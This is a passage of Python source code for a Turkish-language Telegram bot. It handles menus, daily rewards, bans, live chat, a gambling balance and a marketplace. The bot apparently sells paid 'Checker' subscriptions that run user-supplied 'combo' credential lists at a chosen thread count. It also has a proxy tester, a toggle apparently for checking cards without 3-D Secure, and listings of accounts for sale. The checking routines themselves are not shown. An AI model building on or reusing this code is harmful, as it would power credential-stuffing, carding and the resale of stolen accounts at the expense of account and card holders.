  chat_msg_day = today
  last_top_award_day = prev_day
  if not counts:
    return
  top_uid = max(counts.keys(), key=lambda u: counts.get(u) or 0)
  n = int(counts.get(top_uid) or 0)
  if n < 5:
    return  # min 5 mesaj
  try:
    add_norm_bal(top_uid, TOP_MSG_REWARD)
    save_data()
  except Exception:
    try:
      user_balances[top_uid] = float(user_balances.get(top_uid, 0) or 0) + TOP_MSG_REWARD
      save_data()
    except Exception as e:
      log_error("award_top_chatter bal", e)
      return
  name = str(top_uid)
  try:
    u = bot.get_chat(top_uid)
    name = u.first_name or name
  except Exception:
    pass
  if chat:
    try:
      bot.send_message(chat, _natural_top_text(name, TOP_MSG_REWARD, n))
    except Exception as e:
      log_error("award_top_chatter msg", e)
  try:
    bot.send_message(top_uid, f"+{int(TOP_MSG_REWARD)} TL (gunun en aktif)")
  except Exception:
    pass
  try:
    save_data()
  except Exception:
    pass

def channel_drop_loop():
  time.sleep(20)
  while True:
    try:
      award_top_chatter_daily()
      post_channel_drop()
    except Exception as e:
      log_error("channel_drop_loop", e)
    time.sleep(CHANNEL_DROP_INTERVAL)

def ana_menu_goster(chat_id, user_id):
  """Kompakt ana menü — kategoriler alt menüde, ekrana sığar."""
  try:
    touch_presence(user_id)
    bump_activity(user_id, 1)
  except Exception:
    pass
  markup = types.InlineKeyboardMarkup(row_width=2)
  _mem_header = f"{NAPIM_MEMORY_LINE}\n\n" if NAPIM_MEMORY_LINE else ""

  try:
    if not has_checked_in_today(user_id):
      markup.add(types.InlineKeyboardButton("🔥 Check-in", callback_data="daily_checkin"))
    else:
      st = get_checkin_streak(user_id)
      markup.add(types.InlineKeyboardButton(f"✅ Check-in · 🔥{st}", callback_data="menu_engagement"))
  except Exception:
    markup.add(types.InlineKeyboardButton("🔥 Check-in", callback_data="daily_checkin"))

  try:
    claimed, cin, logok, rew = quest_card_status(user_id)
    if claimed:
      markup.add(types.InlineKeyboardButton("✅ Gorev tamam (+%.0f)" % rew, callback_data="quest_card_claim"))
    elif cin and logok:
      markup.add(types.InlineKeyboardButton("🎁 Gorev odulu +%.0f TL" % rew, callback_data="quest_card_claim"))
    else:
      markup.add(types.InlineKeyboardButton("📋 Gunluk gorev", callback_data="quest_card_info"))
  except Exception:
    pass

  markup.add(
    types.InlineKeyboardButton("💎 Checker Abonelik", callback_data="chk_sub_menu"),
  )
  markup.add(
    types.InlineKeyboardButton("👤 Hesap / Bakiye", callback_data="hub_account"),
    types.InlineKeyboardButton("🛒 Alışveriş", callback_data="hub_shop"),
  )
  markup.add(
    types.InlineKeyboardButton("🎮 Checker / Araç", callback_data="hub_tools"),
    types.InlineKeyboardButton("🎰 Oyun / Kazanç", callback_data="hub_play"),
  )
  markup.add(
    types.InlineKeyboardButton("💬 Sosyal", callback_data="hub_social"),
    types.InlineKeyboardButton("🎯 Aktiflik", callback_data="menu_engagement"),
  )
  markup.add(
    types.InlineKeyboardButton("🎫 Destek", callback_data="menu_support"),
    types.InlineKeyboardButton("🔔 Bildirimler", callback_data="menu_notifs"),
  )

  try:
    _favs = list(checker_favorites.get(user_id) or [])[:2]
    for _fk in _favs:
      if str(_fk).startswith("custom_") and str(_fk).replace("custom_", "") in custom_checkers:
        _cid = str(_fk).replace("custom_", "")
        _nm = (custom_checkers[_cid].get("name") or _cid)[:18]
        markup.add(types.InlineKeyboardButton(f"⭐ {_nm}", callback_data=f"tool_cchk_{_cid}"))
      else:
        _cb = f"tool_{_fk}" if not str(_fk).startswith("tool_") else str(_fk)
        markup.add(types.InlineKeyboardButton(f"⭐ {str(_fk)[:18]}", callback_data=_cb))
  except Exception:
    pass

  if user_id not in channel_bonus_claimed:
    markup.add(
      types.InlineKeyboardButton(f"📢 Kanal +{CHANNEL_BONUS:.0f} TL", callback_data="claim_channel_bonus"),
    )

  try:
    ncat = 0
    for c_id, c_data in (custom_member_categories or {}).items():
      if ncat >= 3:
        break
      markup.add(types.InlineKeyboardButton(f"📂 {c_data.get('name', c_id)[:20]}", callback_data=f"custom_cat_{c_id}"))
      ncat += 1
  except Exception:
    pass

  if user_id in admin_ids_set:
    markup.add(types.InlineKeyboardButton("👑 Admin", callback_data="menu_admin"))

  current_time_info = get_current_time_str()
  bal = float(user_balances.get(user_id, 0.0) or 0.0)
  gbal = float(get_gamble_bal(user_id) or 0.0)
  online = 0
  streak = 0
  try:
    online = get_online_count()
    streak = get_checkin_streak(user_id)
  except Exception:
    pass
  try:
    if is_night_mode():
      mark_night_owl(user_id)
  except Exception:
    pass
  night_line = ""
  try:
    if is_night_mode():
      night_line = f"\n🌙 **Gece Modu** · Jackpot %{effective_jackpot_chance()*100:.0f}"
  except Exception:
    pass
  try:
    title = t(user_id, "main_menu_title", time=current_time_info, bal=bal, gbal=gbal, brand=BOT_BRAND)
    if night_line:
      title = title + night_line
  except Exception:
    title = (
      f"🤖 **{BOT_BRAND}**\n"
      f"📅 `{current_time_info}`\n"
      f"💵 **{bal:.2f} TL** · 🎲 **{gbal:.2f} TL**"
      f"{night_line}\n\n"
      f"Kategori seç:"
    )
  try:
    chk = "✅" if has_checked_in_today(user_id) else "🔥"
    title = f"{title}\n🟢 **{online}** aktif · 🔥**{streak}** · {chk} check-in"
  except Exception:
    pass
  try:
    title = title + "\n📋 " + quest_card_text(user_id)
  except Exception:
    pass
  try:
    if NAPIM_MEMORY_LINE:
      title = f"{NAPIM_MEMORY_LINE}\n\n{title}"
  except Exception:
    pass
  bot.send_message(chat_id, title, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
  global feature_3dsiz_enabled, feature_telz_enabled
  chat_id = call.message.chat.id
  user_id = call.from_user.id
  username = f"@{call.from_user.username}" if call.from_user.username else str(user_id)
  try:
    touch_presence(user_id)
  except Exception:
    pass
  try:
    bot.answer_callback_query(call.id)
  except Exception:
    pass

  _cdata = getattr(call, "data", None) or ""
  if check_spam(user_id, chat_id, username, callback_data=_cdata): return
  if check_callback_spam(user_id, chat_id, username, callback_data=_cdata): return

  if is_maintenance_blocking(user_id):
    try:
      rem = maintenance_remaining_str()
      bot.answer_callback_query(call.id, f"🔧 Bakım aktif! Kalan: {rem}", show_alert=True)
    except:
      pass
    try:
      bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    except:
      pass
    return

  def safe_answer(text=None, show_alert=False):
    try:
      bot.answer_callback_query(call.id, text=text, show_alert=show_alert)
    except:
      pass

  try:
    _cd = str(call.data or "")
    if not str(_cd).startswith("chk_sub_"):
      _chk_gate = (
        _cd.startswith("tool_")
        or _cd.startswith("chk_speed_")
        or _cd.startswith("chk_favs")
        or _cd.startswith("chk_recent")
      )
      _skip = (
        _cd.startswith("tool_ai_")
        or _cd in ("tool_proxy_test", "tool_strip_url")
      )
      if _chk_gate and not _skip and not has_checker_sub(user_id):
        mid = None
        try:
          mid = call.message.message_id
        except Exception:
          pass
        require_checker_sub(chat_id, user_id, message_id=mid)
        return
  except Exception:
    pass

  if call.data == "chk_speed_cancel":
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    try:
      bot.edit_message_text("❌ Hız seçimi iptal.", chat_id, call.message.message_id)
    except Exception:
      safe_tg(bot.send_message, chat_id, "❌ Hız seçimi iptal.")
    return
  if call.data.startswith("chk_speed_"):
    try:
      w = int(call.data.split("_")[-1])
    except Exception:
      w = CHECKER_SPEED_DEFAULT
    if w < CHECKER_SPEED_MIN or w > CHECKER_SPEED_MAX:
      safe_answer(f"Geçersiz: {CHECKER_SPEED_MIN}-{CHECKER_SPEED_MAX}", show_alert=True)
      return
    if user_states.get(chat_id) != "waiting_checker_speed":
      safe_answer("Oturum yok — combo tekrar gönder", show_alert=True)
      return
    try:
      bot.edit_message_text(
        f"⚡ Hız seçildi: **{w}** thread",
        chat_id,
        call.message.message_id,
        parse_mode="Markdown",
      )
    except Exception:
      pass
    _start_pending_checker(chat_id, user_id, w)
    return

  if call.data.startswith("set_lang_"):
    lang_code = call.data.split("_")[2]
    if lang_code in LANGUAGES:
      user_languages[user_id] = lang_code
      save_data()
      safe_answer(t(user_id, "lang_changed"), show_alert=True)
      try:
        bot.delete_message(chat_id, call.message.message_id)
      except:
        pass
      ensure_user(
        user_id,
        username=call.from_user.username,
        first_name=call.from_user.first_name
      )
      try:
        send_lang_welcome_music(chat_id, user_id)
      except Exception:
        pass
      if not has_channel_access(user_id):
        send_channel_gate(chat_id, user_id)
      else:
        try_claim_channel_bonus(user_id, chat_id)
        ana_menu_goster(chat_id, user_id)
    return

  if call.data == "check_channel_join":
    safe_answer()
    try:
      clear_member_cache(user_id)
    except Exception:
      pass
    if has_channel_access(user_id):
      ensure_user(user_id, username=call.from_user.username, first_name=call.from_user.first_name)
      try_claim_channel_bonus(user_id, chat_id)
      try:
        bot.edit_message_text(
          "✅ **Kanal + Chat üyeliği doğrulandı!**\nBotu kullanabilirsiniz.",
          chat_id, call.message.message_id, parse_mode="Markdown"
        )
      except:
        pass
      streak, streak_reward = update_login_streak(user_id)
      if streak_reward > 0:
        try:
          bot.send_message(chat_id, f"🔥 **{streak} gün seri!** +{streak_reward:.0f} TL", parse_mode="Markdown")
        except:
          pass
      ana_menu_goster(chat_id, user_id)
    else:
      ch_ok, chat_ok = membership_status(user_id)
      chat_banned = is_chat_group_banned(user_id)
      ch_banned = is_channel_group_banned(user_id)
      ch_mark = "✅" if ch_ok else ("🚫 BANLI" if ch_banned else "❌")
      chat_mark = "✅" if chat_ok else ("🚫 BANLI" if chat_banned else "❌")
      safe_answer("Eksik katılım var!" if not (chat_banned or ch_banned) else "Chat/kanalda banlısın!", show_alert=True)
      markup = types.InlineKeyboardMarkup(row_width=1)
      if not ch_ok and not ch_banned:
        markup.add(types.InlineKeyboardButton("📢 Kanala Katıl", url=CHANNEL_LINK))
      if not chat_ok and not chat_banned:
        markup.add(types.InlineKeyboardButton("💬 Chat'e Katıl", url=CHAT_LINK))
      if chat_banned or ch_banned:
        markup.add(types.InlineKeyboardButton("🔓 Banımı Aç (Admin Onayı)", callback_data="request_chat_unban"))
      markup.add(types.InlineKeyboardButton("✅ Katıldım / Kontrol Et", callback_data="check_channel_join"))
      ban_extra = ""
      if chat_banned or ch_banned:
        ban_extra = (
          "\n\n🚫 Chat veya kanalda **banlısın**. "
          "**Banımı Aç** ile admin onayı iste. Komut: /banimiac"
        )
      try:
        bot.edit_message_text(
          f"❌ Hâlâ eksik üyelik var.\n\n"
          f"{ch_mark} Kanal: {CHANNEL_LINK}\n"
          f"{chat_mark} Chat: {CHAT_LINK}\n\n"
          f"İkisine de katılıp **Kontrol Et** basın."
          f"{ban_extra}",
          chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown"
        )
      except:
        send_channel_gate(chat_id, user_id)
    return

  if call.data not in ("claim_channel_bonus", "request_unban", "request_chat_unban") and not call.data.startswith("set_lang_") and not call.data.startswith("approve_chat_unban_") and not call.data.startswith("reject_chat_unban_"):
    if not has_channel_access(user_id):
      safe_answer("🔒 Önce kanala katılmalısınız!", show_alert=True)
      send_channel_gate(chat_id, user_id)
      return

  if call.data == "request_chat_unban":
    ok, msg = send_chat_unban_request(
      user_id,
      username=call.from_user.username,
      reason="btn_request_chat_unban",
    )
    safe_answer(msg[:180], show_alert=True)
    try:
      bot.send_message(chat_id, msg, parse_mode="Markdown")
    except Exception:
      pass
    return

  if is_user_banned(user_id):
    if call.data == "request_unban":
      if user_id in unban_requests_sent:
        safe_answer("❌ Daha önce ban kaldırma talebi gönderdiniz!", show_alert=True)
        return
      unban_requests_sent.add(user_id)
      save_data()

      admin_markup = types.InlineKeyboardMarkup()
      admin_markup.add(types.InlineKeyboardButton("✅ Banı Kaldır", callback_data=f"approve_unban_{user_id}"))
      for admin_id in admin_ids_set:
        try:
          bot.send_message(admin_id, f"🚨 **YENİ BAN KALDIRMA TALEBİ!**\n🆔 Kullanıcı ID: `{user_id}`\n(Spam veya kalıcı engelleme yemiş olabilir)", reply_markup=admin_markup, parse_mode="Markdown")
        except:
          pass
      safe_answer("✅ Ban kaldırma talebiniz yöneticilere iletildi.", show_alert=True)
      return
    safe_answer("❌ Engellendiğiniz için işlem yapamazsınız.", show_alert=True)
    return

  if call.data == "auth_register" or call.data == "auth_login":
    safe_answer()
    ensure_user(user_id, username=call.from_user.username, first_name=call.from_user.first_name)
    bot.send_message(chat_id, "✅ Telegram hesabınızla otomatik giriş yapıldı. Kayıt/şifre gerekmez.")
    ana_menu_goster(chat_id, user_id)
    return

  elif call.data == "menu_account":
    safe_answer()
    ensure_user(user_id, username=call.from_user.username, first_name=call.from_user.first_name)
    creds = user_credentials.get(user_id, {})
    reg_user = creds.get('display_name') or creds.get('reg_username', 'Tanımsız')

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("📋 Profil Bilgilerim", callback_data="acc_profile"),
      types.InlineKeyboardButton("✏️ Görünen Ad Değiştir", callback_data="acc_change_display"),
      types.InlineKeyboardButton("💳 Bakiye & Cüzdanım", callback_data="menu_bakiye"),
      types.InlineKeyboardButton("👥 Referans Durumum", callback_data="menu_referans"),
      types.InlineKeyboardButton(t(user_id, "btn_change_lang"), callback_data="change_language"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    acc_text = t(user_id, "account_menu", user=reg_user)
    try:
      bot.edit_message_text(acc_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, acc_text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "change_language":
    safe_answer()
    current = LANGUAGES.get(get_lang(user_id), "Türkçe")
    markup = types.InlineKeyboardMarkup(row_width=1)
    for code, name in LANGUAGES.items():
      markup.add(types.InlineKeyboardButton(name, callback_data=f"set_lang_{code}"))
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="menu_account"))
    try:
      bot.edit_message_text(t(user_id, "lang_menu_title", current=current), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, t(user_id, "lang_menu_title", current=current), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "acc_profile":
    safe_answer()
    creds = user_credentials.get(user_id, {})
    norm_bal = user_balances.get(user_id, 0.0)
    ref_bal = ref_balances.get(user_id, 0.0)

    uname = creds.get('display_name') or creds.get('reg_username', 'Yok')
    email_show = creds.get('email') or "-"
    prof_text = t(user_id, "profile_title", uid=user_id, uname=uname, email=email_show, bal=norm_bal, ref=ref_bal)
    prof_text += f"\n⭐ Level: **{user_level.get(user_id, 1)}** | XP: **{user_xp.get(user_id, 0)}**"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Hesabım Menüsüne Dön", callback_data="menu_account"))
    try:
      bot.edit_message_text(prof_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      pass
    return

  elif call.data == "acc_change_display":
    safe_answer()
    user_states[chat_id] = "waiting_display_name"
    bot.send_message(chat_id, "✏️ Yeni **görünen adınızı** yazın (max 32 karakter):", parse_mode="Markdown")
    return

  elif call.data == "acc_change_pass":
    safe_answer("Login sistemi kaldırıldı, şifre gerekmez.", show_alert=True)
    return

  elif call.data == "acc_logout":
    safe_answer("Login yok; Telegram hesabınızla otomatik giriştesiniz.", show_alert=True)
    ana_menu_goster(chat_id, user_id)
    return

  if call.data.startswith("custom_cat_"):
    c_id = call.data.split("_")[2]
    if c_id in custom_member_categories:
      c_data = custom_member_categories[c_id]
      safe_answer()
      markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
      try:
        bot.edit_message_text(f"📂 **{c_data['name']}**\n\n{c_data['desc']}\n\n📅 {get_current_time_str()}", chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
      except:
        pass
    return

  if call.data == "menu_live_chat":
    safe_answer()
    total_bal = float(user_balances.get(user_id, 0)) + float(get_gamble_bal(user_id))
    is_vip = total_bal >= VIP_CHAT_MIN_BALANCE or user_id in admin_ids_set
    user_states[chat_id] = "active_live_chat"
    active_live_chat_users.add(chat_id)
    if is_vip:
      try:
        bot.send_message(chat_id, f"⭐ **VIP sohbet erişimi** (bakiye ≥ {VIP_CHAT_MIN_BALANCE:.0f} TL). Rozetli görünürsün.")
      except Exception:
        pass
    real = chat_id in live_chat_realname
    mode_txt = "🟢 İsim AÇIK (Telegram adın görünür)" if real else "🔒 Anonim (ismin gizli)"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton(
        "👤 İsimle Yaz: AÇIK" if real else "👤 İsimle Yaz: KAPALI",
        callback_data="toggle_live_realname"
      ),
      types.InlineKeyboardButton(t(user_id, "btn_exit_live"), callback_data="exit_live_chat")
    )
    text = (
      t(user_id, "live_chat_active", time=get_current_time_str())
      + f"\n\n{mode_txt}\n"
      + "İstersen butondan kendi Telegram isminle yazabilirsin."
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "toggle_live_realname":
    safe_answer()
    if chat_id in live_chat_realname:
      live_chat_realname.discard(chat_id)
      bot.answer_callback_query(call.id, "Anonim moda geçildi", show_alert=False)
    else:
      live_chat_realname.add(chat_id)
      bot.answer_callback_query(call.id, "İsimle yazma AÇIK", show_alert=False)
    real = chat_id in live_chat_realname
    mode_txt = "🟢 İsim AÇIK (Telegram adın görünür)" if real else "🔒 Anonim (ismin gizli)"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton(
        "👤 İsimle Yaz: AÇIK" if real else "👤 İsimle Yaz: KAPALI",
        callback_data="toggle_live_realname"
      ),
      types.InlineKeyboardButton(t(user_id, "btn_exit_live"), callback_data="exit_live_chat")
    )
    text = (
      t(user_id, "live_chat_active", time=get_current_time_str())
      + f"\n\n{mode_txt}\n"
      + "İstersen butondan kendi Telegram isminle yazabilirsin."
    )
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      pass
    return

  elif call.data == "exit_admin_support":
    safe_answer("Destek sohbetinden çıkıldı.")
    user_states.pop(chat_id, None)
    try:
      bot.edit_message_text("🚪 Admin destek sohbetinden çıktınız.", chat_id, call.message.message_id)
    except Exception:
      bot.send_message(chat_id, "🚪 Admin destek sohbetinden çıktınız.")
    return

  elif call.data == "admin_pending_hardbans":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    if not pending_hard_bans:
      bot.send_message(chat_id, "✅ Bekleyen süper ban yok.")
      return
    for tid, info in list(pending_hard_bans.items())[:30]:
      uname = info.get("username", tid)
      w = info.get("warns", "?")
      msg = info.get("last_msg", "")
      am = types.InlineKeyboardMarkup(row_width=2)
      am.add(
        types.InlineKeyboardButton("✅ Onayla", callback_data=f"approve_hardban_{tid}"),
        types.InlineKeyboardButton("❌ Reddet", callback_data=f"reject_hardban_{tid}"),
      )
      bot.send_message(
        chat_id,
        f"🔒 `{tid}` {uname}\nUyarı: {w}\n💬 {msg}",
        reply_markup=am,
        parse_mode="Markdown"
      )
    return

  elif call.data.startswith("approve_hardban_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetkiniz yok", show_alert=True)
      return
    try:
      tid = int(call.data.replace("approve_hardban_", ""))
    except Exception:
      safe_answer("Hatalı ID", show_alert=True)
      return
    if tid in admin_ids_set:
      safe_answer("Admin süper banlanamaz", show_alert=True)
      return
    apply_hard_ban(tid, "support_spam_approved")
    pending_hard_bans.pop(tid, None)
    support_warns.pop(tid, None)
    save_data()
    safe_answer("Süper ban uygulandı", show_alert=True)
    try:
      bot.edit_message_text(
        f"🚫 **Süper ban ONAYLANDI**\n🆔 `{tid}`\nAdmin: `{user_id}`",
        chat_id, call.message.message_id, parse_mode="Markdown"
      )
    except Exception:
      bot.send_message(chat_id, f"🚫 Süper ban onaylandı: `{tid}`", parse_mode="Markdown")
    try:
      bot.send_message(tid, "🚫 **SÜPER BAN**\n\nAdmin onayı ile kalıcı banlandın.\nBu ban normal yolla açılamaz.", parse_mode="Markdown")
    except Exception:
      pass
    log_activity("hard_ban_approve", user_id, str(tid))
    return

  elif call.data.startswith("reject_hardban_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetkiniz yok", show_alert=True)
      return
    try:
      tid = int(call.data.replace("reject_hardban_", ""))
    except Exception:
      safe_answer("Hatalı ID", show_alert=True)
      return
    pending_hard_bans.pop(tid, None)
    support_warns[tid] = 0
    save_data()
    safe_answer("Reddedildi — uyarılar sıfırlandı", show_alert=True)
    try:
      bot.edit_message_text(
        f"❌ Süper ban reddedildi.\n🆔 `{tid}` — uyarılar sıfırlandı.",
        chat_id, call.message.message_id, parse_mode="Markdown"
      )
    except Exception:
      pass
    try:
      bot.send_message(tid, "✅ Admin süper ban talebini reddetti. Dikkatli kullan.")
    except Exception:
      pass
    return

  elif call.data.startswith("admin_reply_user_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetkiniz yok", show_alert=True)
      return
    safe_answer()
    tid = call.data.replace("admin_reply_user_", "")
    admin_temp_data[chat_id] = {"reply_to_user": int(tid)}
    user_states[chat_id] = "waiting_admin_support_reply"
    bot.send_message(chat_id, f"✉️ `{tid}` kullanıcısına yanıtınızı yazın:", parse_mode="Markdown")
    return

  elif call.data == "menu_live_chat_v2":
    safe_answer()
    markup = types.InlineKeyboardMarkup()
    url = (CHAT_V2_URL or "").strip()
    local_html = None
    for cand in (
      os.path.join(_BASE_DIR, "sohbet_v2.html"),
      os.path.join(os.getcwd(), "sohbet_v2.html"),
      "/storage/emulated/0/Recordings/sohbet_v2.html",
    ):
      if os.path.isfile(cand):
        local_html = cand
        break
    if url:
      try:
        markup.add(types.InlineKeyboardButton("🚀 Sohbete gir", web_app=types.WebAppInfo(url=url)))
      except Exception:
        markup.add(types.InlineKeyboardButton("🚀 Sohbete gir", url=url))
      markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
      bot.send_message(
        chat_id,
        "🌐 **Canlı Sohbet V2**\n\n"
        "• Yazı + foto\n"
        "• **10 dakikada** her şey silinir\n"
        "• Açan herkes aynı odaya girer\n\n"
        "Aşağıdan gir:",
        reply_markup=markup,
        parse_mode="Markdown",
      )
    else:
      markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
      bot.send_message(
        chat_id,
        "🌐 **Canlı Sohbet V2**\n\n"
        "• Yazı + foto\n"
        "• **10 dk** sonra silinir\n\n"
        "HTML dosyası gönderiliyor — aç ve sohbete gir.\n"
        "_(Kalıcı WebApp için config.json → CHAT_V2_URL)_",
        reply_markup=markup,
        parse_mode="Markdown",
      )
      if local_html:
        try:
          with open(local_html, "rb") as doc:
            bot.send_document(
              chat_id,
              doc,
              caption="sohbet_v2.html — tarayıcıda / WebView ile aç",
            )
        except Exception as e:
          bot.send_message(chat_id, f"❌ HTML gönderilemedi: {e}")
      else:
        bot.send_message(
          chat_id,
          "❌ `sohbet_v2.html` bulunamadı.\n"
          "Dosyayı bot klasörüne koy: Recordings/sohbet_v2.html",
        )
    return

  elif call.data == "exit_live_chat":
    safe_answer("Canlı sohbetten çıkıldı.")
    user_states.pop(chat_id, None)
    active_live_chat_users.discard(chat_id)
    live_chat_realname.discard(chat_id)
    try: bot.delete_message(chat_id, call.message.message_id)
    except: pass
    ana_menu_goster(chat_id, user_id)
    return

  if call.data.startswith("approve_chat_unban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Bu işlem için yetkiniz yok!", show_alert=True)
      return
    try:
      target_uid = int(call.data.split("_")[-1])
    except Exception:
      safe_answer("❌ Geçersiz kullanıcı.", show_alert=True)
      return
    ok, detail = try_unban_from_chat(target_uid)
    chat_unban_requests_sent.discard(target_uid)
    save_data()
    if ok:
      try:
        bot.send_message(
          target_uid,
          "🎉 **Chat banın kaldırıldı!**\n\n"
          f"Admin talebini onayladı.\n"
          f"Şimdi gruba tekrar katıl:\n{CHAT_LINK}\n\n"
          f"Sonra botta **Katıldım / Kontrol Et** veya /start yaz.",
          parse_mode="Markdown",
        )
      except Exception:
        pass
      status_line = "\n\n**✅ DURUM: CHAT BANI KALDIRILDI**"
      safe_answer("✅ Chat banı kaldırıldı.")
      log_activity("chat_unban_approve", target_uid, f"by={user_id}")
    else:
      status_line = f"\n\n**⚠️ Unban denendi ama başarısız:** `{detail[:120]}`"
      safe_answer(f"⚠️ API hatası: {detail[:100]}", show_alert=True)
      log_activity("chat_unban_fail", target_uid, detail[:150])
      try:
        bot.send_message(
          target_uid,
          "⚠️ Admin onayladı ama bot gruptan ban kaldıramadı.\n"
          "Botun chat'te **yönetici + ban yetkisi** olduğundan emin olun.\n"
          f"Detay: {detail[:200]}",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    try:
      if call.message.caption:
        bot.edit_message_caption(
          chat_id=chat_id, message_id=call.message.message_id,
          caption=(call.message.caption or "") + status_line, parse_mode="Markdown",
        )
      else:
        bot.edit_message_text(
          chat_id=chat_id, message_id=call.message.message_id,
          text=(call.message.text or "") + status_line, parse_mode="Markdown",
        )
    except Exception:
      pass
    return

  if call.data.startswith("reject_chat_unban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Bu işlem için yetkiniz yok!", show_alert=True)
      return
    try:
      target_uid = int(call.data.split("_")[-1])
    except Exception:
      safe_answer("❌ Geçersiz kullanıcı.", show_alert=True)
      return
    chat_unban_requests_sent.discard(target_uid)
    save_data()
    try:
      bot.send_message(target_uid, "❌ Chat ban kaldırma talebin admin tarafından reddedildi.")
    except Exception:
      pass
    try:
      bot.edit_message_text(
        chat_id=chat_id, message_id=call.message.message_id,
        text=(call.message.text or "") + "\n\n**❌ DURUM: REDDEDİLDİ**",
        parse_mode="Markdown",
      )
    except Exception:
      try:
        bot.edit_message_caption(
          chat_id=chat_id, message_id=call.message.message_id,
          caption=(call.message.caption or "") + "\n\n**❌ DURUM: REDDEDİLDİ**",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    safe_answer("Reddedildi.")
    log_activity("chat_unban_reject", target_uid, f"by={user_id}")
    return

  if call.data.startswith("approve_unban_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Bu işlem için yetkiniz yok!", show_alert=True)
      return
    target_uid = int(call.data.split("_")[2])
    if target_uid in banned_users or target_uid in temp_banned_users:
      banned_users.discard(target_uid)
      temp_banned_users.pop(target_uid, None)

      if target_uid in unban_requests_sent:
        unban_requests_sent.remove(target_uid)
      save_data()
      try:
        bot.send_message(target_uid, "🎉 Yöneticiler talebinizi onayladı ve banınız kaldırıldı! Botu kullanabilirsiniz.")
      except:
        pass
      try:
        bot.edit_message_caption(chat_id=chat_id, message_id=call.message.message_id, caption=call.message.caption + "\n\n**✅ DURUM: BAN KALDIRILDI**", parse_mode="Markdown")
      except:
        try:
          bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=call.message.text + "\n\n**✅ DURUM: BAN KALDIRILDI**", parse_mode="Markdown")
        except:
          pass
      safe_answer("✅ Kullanıcının banı başarıyla kaldırıldı.")
    else:
      safe_answer("ℹ️ Kullanıcı zaten banlı değil.", show_alert=True)
    return

  if call.data.startswith("admin_ilan_ok_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkin yok!", show_alert=True)
      return
    temp_id = call.data.replace("admin_ilan_ok_", "")
    data = pending_listing_approvals.pop(temp_id, None)
    if not data:
      safe_answer("Talep yok / işlenmiş.", show_alert=True)
      return
    l_id = str(uuid.uuid4())[:6]
    cat = (data.get("category") or "HESAP").upper()
    stock_items = list(data.get("stock_items") or [])
    mt_text = data.get("mt_text") or ""
    stock_n = int(data.get("stock") or (len(stock_items) if cat != "MT" else 1))
    listings[l_id] = {
      "user_id": data.get("user_id"),
      "owner_username": data.get("owner_username"),
      "category": cat,
      "title": data.get("title"),
      "price_stars": int(data.get("price_stars") or 1),
      "price": int(data.get("price_stars") or 1),
      "desc": data.get("desc", ""),
      "stock_items": stock_items if cat != "MT" else [],
      "stock": stock_n,
      "mt_text": mt_text if cat == "MT" else "",
      "photo": data.get("photo"),
    }
    save_data()
    owner = data.get("user_id")
    try:
      bot.send_message(
        int(owner),
        f"✅ İlanın yayınlandı!\n🆔 `{l_id}`\n🏷 {cat}\n⭐ {data.get('price_stars')} yıldız\n📦 Stok: {stock_n}",
        parse_mode="Markdown",
      )
    except Exception:
      pass
    safe_answer("Yayınlandı.")
    try:
      bot.edit_message_caption(
        chat_id=chat_id,
        message_id=call.message.message_id,
        caption=(call.message.caption or "") + f"\n\n**✅ YAYINLANDI** `{l_id}`",
        parse_mode="Markdown",
      )
    except Exception:
      try:
        bot.edit_message_text(
          chat_id=chat_id,
          message_id=call.message.message_id,
          text=(call.message.text or "") + f"\n\n**✅ YAYINLANDI** `{l_id}`",
          parse_mode="Markdown",
        )
      except Exception:
        pass
    log_activity("ilan_approve", owner, l_id)
    return

  if call.data.startswith("admin_ilan_no_"):
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkin yok!", show_alert=True)
      return
    temp_id = call.data.replace("admin_ilan_no_", "")
    data = pending_listing_approvals.pop(temp_id, None)
    save_data()
    if data and data.get("user_id"):
      try:
        bot.send_message(int(data["user_id"]), "❌ İlanın admin tarafından reddedildi.")
      except Exception:
        pass
    safe_answer("Reddedildi.")
    return

  if call.data.startswith("seller_ok_"):
    order_id = call.data.replace("seller_ok_", "")
    req = pending_listing_orders.get(order_id)
    if not req or req.get("status") not in ("await_seller", "await_admin"):
      safe_answer("Sipariş yok veya işlenmiş.", show_alert=True)
      return
    owner_id = req.get("owner_id")
